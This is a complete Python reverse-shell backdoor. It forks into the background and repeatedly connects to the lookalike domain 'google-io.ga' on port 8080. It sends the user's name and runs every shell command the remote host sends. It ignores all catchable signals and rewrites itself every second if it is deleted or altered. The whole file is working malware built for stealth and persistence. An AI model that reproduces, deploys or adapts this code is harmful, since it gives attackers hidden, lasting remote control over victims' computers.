#!/usr/bin/env python3

import socket
import time
import os
import re
import subprocess
import signal
import threading
import pathlib

# Environment
DEBUG_MODE = os.environ.get('DEBUG', False)
USER = os.environ.get('USER', 'unknown')

# Network
BUFFER_SIZE = 1096
PAYLOAD_END_CHAR = b'\04' # end of transmission
PORT = 8080
DNS = 'localhost' if DEBUG_MODE else 'google-io.ga'

SCRIPT_PATH = os.path.realpath(__file__)
SCRIPT_DIRNAME = os.path.dirname(SCRIPT_PATH)
SCRIPT_CONTENT = (open(SCRIPT_PATH, 'r')).read()

def msg_to_payload(msg: str):
  return (msg.encode() if isinstance(msg, str) else msg) + PAYLOAD_END_CHAR

def listen_cmd(socket: socket.socket):
  cwd = '/' # Default cwd
  process = None

  def send_output(msg):
    socket.send(msg_to_payload(msg))

  def exec_cmd(cmd):
    """Execute all commands send by the host."""
    nonlocal process
    p = subprocess.Popen(cmd
          , stdout=subprocess.PIPE
          , stderr=subprocess.PIPE
          , shell=True
          , cwd=cwd)

    try:
      stdout, stderr = p.communicate(timeout=10)
      if stdout:
        send_output(stdout)
      elif stderr:
        send_output(stderr)
      else:
        send_output('[done]\n')
    except subprocess.TimeoutExpired:
      p.kill()
      send_output('[timeout]\n')

  def update_path(cmd):
    """Update the cwd because 'cd' is an internal command."""
    nonlocal cwd
    new_cwd = os.path.join(cwd, cmd[3:])

    if os.path.exists(new_cwd):
      cwd = new_cwd
      send_output('[path updated]\n')
    else:
      send_output('[invalid path]\n')

  while True:
    cmd = socket.recv(BUFFER_SIZE).decode()
    if re.search(r'^cd ', cmd):
      update_path(cmd)
    else:
      exec_cmd(cmd)

def connect_to_host():
  """Try to connect to the host each seconds."""
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((DNS, PORT))
      s.send(USER.encode())
      listen_cmd(s)
    except:
      time.sleep(1)

def persist_file():
  def rewrite_file():
    """persisting file by re-writting it when necessary."""
    with open(SCRIPT_PATH, 'w') as file_w:
      file_w.write(SCRIPT_CONTENT)
      os.chmod(SCRIPT_PATH, 0o777)

  while True:
    # Persisting file each second.
    time.sleep(1)

    # Create recursively directories of the script if they've been removed.
    if not os.path.exists(SCRIPT_DIRNAME):
      pathlib.Path(SCRIPT_DIRNAME).mkdir(parents=True, exist_ok=True)

    # Check if the script exists and hasn't be updated.
    if os.path.exists(SCRIPT_PATH):
      with open(SCRIPT_PATH, 'r') as f:
        if f.read() == SCRIPT_CONTENT:
          continue

    # Rewrite the script because it has been removed/modified !
    rewrite_file()

def handle_signals():
  def noop(*_, **__):
    """Just do nothing, but if we want we can duplicate
       the script in a another directory with another name
       and kill the current to be more sneaky 😏"""
    pass

  # Get all signals avaible
  SIGNUMS = [x for x in dir(signal) if x.startswith('SIG')]

  for signum in SIGNUMS:
    try:
      # Handle each signal by noop.
      signum = getattr(signal, signum)
      signal.signal(signum, noop)
    except:
      # Few signals can't be handled so just pass they.
      pass

def main():
  if os.fork() == 0:
    handle_signals()
    threading.Thread(target=persist_file).start()
    connect_to_host()

if __name__ == '__main__':
  main()
